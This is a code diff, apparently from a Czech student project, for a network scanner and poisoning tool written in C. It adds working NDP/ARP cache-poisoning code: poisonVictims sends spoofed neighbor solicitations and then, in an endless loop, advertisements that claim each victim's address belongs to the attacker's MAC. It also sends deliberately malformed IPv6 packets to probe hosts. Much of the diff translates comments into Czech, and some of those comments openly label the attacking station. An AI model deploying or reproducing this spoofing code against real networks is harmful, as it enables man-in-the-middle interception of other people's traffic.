@@ -314,6 +314,7 @@ void scanNetwork(INTERFACE_INFO* intInfo,pcap_t* descriptor)
 		scanIPv6(intInfo,true);
 		cerr<<"Scan IPv6 rozselán."<<endl;
 //		ARPSniffer(descriptor, (pcap_handler)parsePacket);
+		usleep(119000000);
 		exit(EXIT_SUCCESS);
 	}
 	else
@@ -415,27 +416,25 @@ void scanIPv6(INTERFACE_INFO* intInfo, bool malform)
 	uint8_t *data, *dst_mac, *send_ether_frame;
 	struct sockaddr_ll device;
 
-	// Allocate memory for various arrays.
+	// Alokace paměti
 	dst_mac = allocate_ustrmem (6);
 	data = allocate_ustrmem (IP_MAXPACKET);
 	send_ether_frame = allocate_ustrmem (IP_MAXPACKET);
 
-	// Submit request for a socket descriptor to look up interface.
-	// We'll use it to send packets as well, so we leave it open.
+	// Vytvoření socketu
 	if ((sendsd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
 		perror ("socket() failed to get socket descriptor for using ioctl() ");
 		exit (EXIT_FAILURE);
 	}
 
-	// Find interface index from interface name and store index in
-	// struct sockaddr_ll device, which will be used as an argument of sendto().
+	// Získání informací o interfaci a vložení do struktury
 	memset (&device, 0, sizeof (device));
 	if ((device.sll_ifindex = if_nametoindex (intInfo->interface)) == 0) {
 		perror ("if_nametoindex() failed to obtain interface index ");
 		exit (EXIT_FAILURE);
 	}
 
-	// Set destination MAC address: you need to fill these out
+	// Nastavení cílové MAC adresy (multicast)
 	dst_mac[0] = 0x33;
 	dst_mac[1] = 0x33;
 	dst_mac[2] = 0x00;
@@ -443,12 +442,11 @@ void scanIPv6(INTERFACE_INFO* intInfo, bool malform)
 	dst_mac[4] = 0x00;
 	dst_mac[5] = 0x01;
 
-	// Fill out sockaddr_ll.
 	device.sll_family = AF_PACKET;
 	memcpy (device.sll_addr, intInfo->interfaceMac, 6 * sizeof (uint8_t));
 	device.sll_halen = 6;
 
-	// ICMP data
+	// ICMP data - nepotřebné víceméně
 	datalen = 4;
 	data[0] = 'T';
 	data[1] = 'e';
@@ -456,19 +454,14 @@ void scanIPv6(INTERFACE_INFO* intInfo, bool malform)
 	data[3] = 't';
 
 	// IPv6 header
-//	fillIPv6hdr(intInfo, send_iphdr, datalen);
-	// IPv6 version (4 bits), Traffic class (8 bits), Flow label (20 bits)
 	send_iphdr.ip6_flow = htonl ((6 << 28) | (0 << 20) | 0);
-	// Hop limit (8 bits): default to maximum value
 	send_iphdr.ip6_hops = 255;
 	// Source IPv6 address (128 bits)
 	inet_pton (AF_INET6, intInfo->interfaceAddv6a, &(send_iphdr.ip6_src));
 	// Destination IPv6 address (128 bits)
 	inet_pton (AF_INET6, "ff02::1", &(send_iphdr.ip6_dst));
-
-	
+	// Pokud chceme poslat poničený packet
 	if(malform){
-		// Payload length (16 bits): ICMP header + ICMP data
 		send_iphdr.ip6_plen = htons (32);
 		send_iphdr.ip6_nxt = 0;
 		
@@ -476,6 +469,7 @@ void scanIPv6(INTERFACE_INFO* intInfo, bool malform)
 		hophdr.nxt_hdr = IPPROTO_ICMPV6;
 		hophdr.hdr_len = 1;
 		
+		// Vložení malformed částí packetu - bity z Wiresharku, neměnný packet
 		u_char hop_opt[MALFORMED_SIZE];
 		hop_opt[0] = 0x80;
 		hop_opt[1] = 0x01;
@@ -539,28 +533,23 @@ void scanIPv6(INTERFACE_INFO* intInfo, bool malform)
 		send_icmphdr.icmp6_type = ICMP6_ECHO_REQUEST;
 		// Message Code (8 bits): echo request
 		send_icmphdr.icmp6_code = 0;
-		// Identifier (16 bits): usually pid of sending process - pick a number
 		send_icmphdr.icmp6_id = htons (1000);
-		// Sequence Number (16 bits): starts at 0
 		send_icmphdr.icmp6_seq = htons (0);
 		// ICMP header checksum (16 bits): set to 0 when calculating checksum
 		send_icmphdr.icmp6_cksum = 0;
 		send_icmphdr.icmp6_cksum = icmp6_checksum (send_iphdr, send_icmphdr, data, datalen);
 		
-
-		// Fill out ethernet frame header.
-		// Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (IP header + ICMP header + ICMP data)
-		frame_length = 6 + 6 + 2 + IP6_HDRLEN + ICMP_HDRLEN + datalen;
+		// Velikost packetu - velikosti jednotlivých částí)
+		frame_length = ETH_HDRLEN + IP6_HDRLEN + ICMP_HDRLEN + datalen;
 		// Destination and Source MAC addresses
 		memcpy (send_ether_frame, dst_mac, 6 * sizeof (uint8_t));
 		memcpy (send_ether_frame + 6, intInfo->interfaceMac, 6 * sizeof (uint8_t));
 
-		// Next is ethernet type code (ETH_P_IPV6 for IPv6).
-		// http://www.iana.org/assignments/ethernet-numbers
+		// ETH kód
 		send_ether_frame[12] = ETH_P_IPV6 / 256;
 		send_ether_frame[13] = ETH_P_IPV6 % 256;
 
-		// Next is ethernet frame data (IPv6 header + ICMP header + ICMP data).
+		// Kopírování hlaviček za sebe v paměti - tvorba paketu
 		// IPv6 header
 		memcpy (send_ether_frame + ETH_HDRLEN, &send_iphdr, IP6_HDRLEN * sizeof (uint8_t));
 		// ICMP header
@@ -569,7 +558,7 @@ void scanIPv6(INTERFACE_INFO* intInfo, bool malform)
 		memcpy (send_ether_frame + ETH_HDRLEN + IP6_HDRLEN + ICMP_HDRLEN, data, datalen * sizeof (uint8_t));
 	}
 
-		// Send ethernet frame to socket.
+	// Odeslání packetu
 	if (sendto (sendsd, send_ether_frame, frame_length, 0, (struct sockaddr *) &device, sizeof (device)) <= 0) {
 		perror ("sendto() failed ");
 		exit (EXIT_FAILURE);
@@ -609,8 +598,6 @@ void ARPSniffer(pcap_t* descriptor, pcap_handler func)
 	cerr<<"Func: capturePacket exit(succes)"<<endl;
 	cerr<<"Celkem ARP paketů: "<<l<<endl;
 	cerr<<"Celkem ICMP paketů: "<<h<<endl;
-	
-	
 }
 
 
@@ -702,35 +689,29 @@ void poisonVictims(INTERFACE_INFO* intInfo, int time, char* mac1, char* mac2, ch
 {
 	int sockfd;
 	struct sockaddr_ll device;
-	
-	// Fill out hints for getaddrinfo().
-//	memset (&hints, 0, sizeof (struct addrinfo));
-//	hints.ai_family = AF_INET;
-//	hints.ai_socktype = SOCK_STREAM;
-//	hints.ai_flags = hints.ai_flags | AI_CANONNAME;
-	
+		
 	memset (&device, 0, sizeof (device));
 	if ((device.sll_ifindex = if_nametoindex (intInfo->interface)) == 0) {
 		perror ("if_nametoindex() failed to obtain interface index ");
 		exit (EXIT_FAILURE);
 	}
-//		printf ("Index for interface %s is %i\n", intInfo->interface, device.sll_ifindex);
-
-//	// Resolve target using getaddrinfo().
-//	if ((status = getaddrinfo (ip1, NULL, &hints, &res)) != 0) {
-//		fprintf (stderr, "getaddrinfo() failed: %s\n", gai_strerror (status));
-//		exit (EXIT_FAILURE);
-//	}
-//	ipv4 = (struct sockaddr_in *) res->ai_addr;
-////		memcpy (&arphdr.tha, &ipv4->sin_addr, 4 * sizeof (uint8_t));
-//	freeaddrinfo (res);
-
-	// Fill out sockaddr_ll.
 	
 	device.sll_family = AF_PACKET;
 	memcpy (device.sll_addr, intInfo->interfaceMac, 6 * sizeof (uint8_t));
 	device.sll_halen = 6;
+	
+	// Vytvoření socketu pro odeslání prvního NS
+	if ((sockfd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
+		perror ("socket() failed ");
+		exit (EXIT_FAILURE);
+	}
 			
+	sendPacketNDP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device, ND_NEIGHBOR_SOLICIT);	// Navázání spojení pro otrávení
+	sendPacketNDP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device ,ND_NEIGHBOR_SOLICIT);	// Navázání spojení pro otrávení
+	
+	close(sockfd);
+	
+	// Kontinuální posílání pro otrávení NDP/ARP cache
 	while(1){
 		// Vytvoření socketu
 		if ((sockfd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
@@ -750,13 +731,11 @@ void poisonVictims(INTERFACE_INFO* intInfo, int time, char* mac1, char* mac2, ch
 			printMAC(intInfo->interfaceMac);
 			cerr<<endl;
 			// Zasílání NDP packetů
-			sendPacketNDP(intInfo->interfaceMac,ip1,mac1,mac2,ip2,sockfd, device);
+			sendPacketNDP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device, ND_NEIGHBOR_ADVERT);	// Podvržení MAC adress
 			cerr<<"Odeslán první NDP"<<endl;
-			sendPacketNDP(intInfo->interfaceMac,ip2,mac2,mac1,ip1,sockfd, device);		
+			sendPacketNDP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device ,ND_NEIGHBOR_ADVERT);	// Podvržení MAC adres	
 			cerr<<"Odeslán první NDP"<<endl;
 		}
-
-				
 		close(sockfd);
 		usleep(time*1000000);
 	}
@@ -790,13 +769,13 @@ u_char* createMacAdress(uint8_t* outMac, char* inMac)
 }
 
 /**
- * Funkce pro odeslání otráveného/správného ARP paketu.
- * @param srcMac - zdrojová MAC adresa
- * @param srcIp - zdrojová IP adresa
- * @param dstMac - cílová MAC adresa
- * @param dstIp - cílová IP adresa
+ * Funkce pro odeslání ARP packetů. Jako parametry jsou nastaveny adresy (MAC a IP), které jsou v ARP packetu vyplněny a odeslány.
+ * @param srcMac - zdrojová MAC adresa (MAC stanice, která provádí útok)
+ * @param srcIp - zdrojová IP (obě B/A)
+ * @param dstMac - cílová MAC (obě A/B)
+ * @param dstIp - cílová IP (oběť B/A)
  * @param socket - socket
- * @param device - informace interface pro odeslání
+ * @param device - interface pro odeslání
  */
 void sendPacketARP(u_char* srcMac,
 				char* srcIp,
@@ -849,14 +828,23 @@ void sendPacketARP(u_char* srcMac,
 	}
 }
 
-
+/**
+ * Funkce pro odeslání NDP packetů. Jako parametry jsou nastaveny adresy (MAC a IP), které jsou v ARP packetu vyplněny a odeslány.
+ * @param interfaceMac - zdrojová MAC adresa (MAC stanice, která provádí útok)
+ * @param srcIp - zdrojová IP (obě B/A)
+ * @param dstMac - cílová MAC (obě A/B)
+ * @param dstIp - cílová IP (oběť B/A)
+ * @param socket - socket
+ * @param device - interface pro odeslání
+ * @param PACKET_TYPE - typ packetu (NA/NS)
+ */
 void sendPacketNDP(u_char* interfaceMac,
 				char* srcIp,
-				char* srcMac,
 				char* dstMac,
 				char* dstIp,
 				int socket,
-				struct sockaddr_ll device)
+				struct sockaddr_ll device,
+				int PACKET_TYPE)
 {
 	// #####################################################################x
 	int frame_length;
@@ -865,38 +853,27 @@ void sendPacketNDP(u_char* interfaceMac,
 	ICMPV6_OPT icmpv6_opt;
 	uint8_t *data, *dst_mac, *send_ether_frame;
 
-	// Allocate memory for various arrays.
+	// Alokace paměti
 	dst_mac = allocate_ustrmem (6);
 	data = allocate_ustrmem (IP_MAXPACKET);
 	send_ether_frame = allocate_ustrmem (IP_MAXPACKET);
-//	icmpv6_opt = allocate_ustrmem(28);
 	
 	// Vyvoření MAC adresy oběti
 	createMacAdress(dst_mac,dstMac);
 
 	// IPv6 header
-//	fillIPv6hdr(intInfo, send_iphdr, datalen);
-	// IPv6 version (4 bits), Traffic class (8 bits), Flow label (20 bits)
 	send_iphdr.ip6_flow = htonl ((6 << 28) | (0 << 20) | 0);
-	// Hop limit (8 bits): default to maximum value
 	send_iphdr.ip6_hops = 255;
 	// Source IPv6 address (128 bits)
 	inet_pton (AF_INET6, srcIp, &(send_iphdr.ip6_src));
 	// Destination IPv6 address (128 bits)
 	inet_pton (AF_INET6, dstIp, &(send_iphdr.ip6_dst));
-
-	// Payload length (16 bits): ICMP header + ICMP data
 	send_iphdr.ip6_plen = htons (4 + 28);
 	send_iphdr.ip6_nxt = IPPROTO_ICMPV6;		
+	
 	// ICMP header
-	// Message Type (8 bits): echo request
-	send_icmphdr.icmp6_type = ND_NEIGHBOR_ADVERT;  // Soci nastaveno
-	// Message Code (8 bits): echo request
+	send_icmphdr.icmp6_type = PACKET_TYPE;  // Soci nastaveno
 	send_icmphdr.icmp6_code = 0;
-	// Identifier (16 bits): usually pid of sending process - pick a number
-//	send_icmphdr.icmp6_id = htons (1000);
-	// Sequence Number (16 bits): starts at 0
-//	send_icmphdr.icmp6_seq = htons (0);
 	
 	// R,S,O, res nastavení
 	icmpv6_opt.flags[0] = 0x50;
@@ -906,7 +883,10 @@ void sendPacketNDP(u_char* interfaceMac,
 	// Zdrojová IP
 	inet_pton (AF_INET6, srcIp, &(icmpv6_opt.ip6_src));
 	// MAC adresa
-	icmpv6_opt.type = 0x02;
+	if(PACKET_TYPE == ND_NEIGHBOR_ADVERT)
+		icmpv6_opt.type = 0x02;
+	else
+		icmpv6_opt.type = 0x01;
 	icmpv6_opt.len = 0x01;
 	memcpy(icmpv6_opt.mac,interfaceMac,6*sizeof(u_char));
 		
@@ -914,19 +894,17 @@ void sendPacketNDP(u_char* interfaceMac,
 	send_icmphdr.icmp6_cksum = 0;
 	send_icmphdr.icmp6_cksum = icmp6_checksum2 (send_iphdr, send_icmphdr, &icmpv6_opt, ICMP_NA_OPT_LEN);	
 	
-	// Fill out ethernet frame header.
-	// Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (IP header + ICMP header + ICMP data)
-	frame_length = 6 + 6 + 2 + IP6_HDRLEN + ICMP_NA_LEN + ICMP_NA_OPT_LEN;
+	// Velikost packetu - velikosti jednotlivých částí
+	frame_length = ETH_HDRLEN + IP6_HDRLEN + ICMP_NA_LEN + ICMP_NA_OPT_LEN;
 	// Destination and Source MAC addresses
 	memcpy (send_ether_frame, dst_mac, 6 * sizeof (uint8_t));
 	memcpy (send_ether_frame + 6, interfaceMac, 6 * sizeof (uint8_t));
 
-	// Next is ethernet type code (ETH_P_IPV6 for IPv6).
-	// http://www.iana.org/assignments/ethernet-numbers
+	// ETH kód
 	send_ether_frame[12] = ETH_P_IPV6 / 256;
 	send_ether_frame[13] = ETH_P_IPV6 % 256;
 
-	// Next is ethernet frame data (IPv6 header + ICMP header + ICMP data).
+	// Kopírování hlaviček za sebe v paměti - tvorba paketu
 	// IPv6 header
 	memcpy (send_ether_frame + ETH_HDRLEN, &send_iphdr, IP6_HDRLEN * sizeof (uint8_t));
 	// ICMP header
@@ -934,12 +912,11 @@ void sendPacketNDP(u_char* interfaceMac,
 	// ICMP data
 	memcpy (send_ether_frame + ETH_HDRLEN + IP6_HDRLEN + ICMP_NA_LEN, &icmpv6_opt, ICMP_NA_OPT_LEN * sizeof (uint8_t));
 
-	// Send ethernet frame to socket.
+	// odeslání paketu
 	if (sendto (socket, send_ether_frame, frame_length, 0, (struct sockaddr *) &device, sizeof (device)) <= 0) {
 		perror ("sendto() failed ");
 		exit (EXIT_FAILURE);
 	}		
-//	cerr<<"Odesláno"<<endl;
 	free(send_ether_frame);
 	free(dst_mac);
 	free(data);
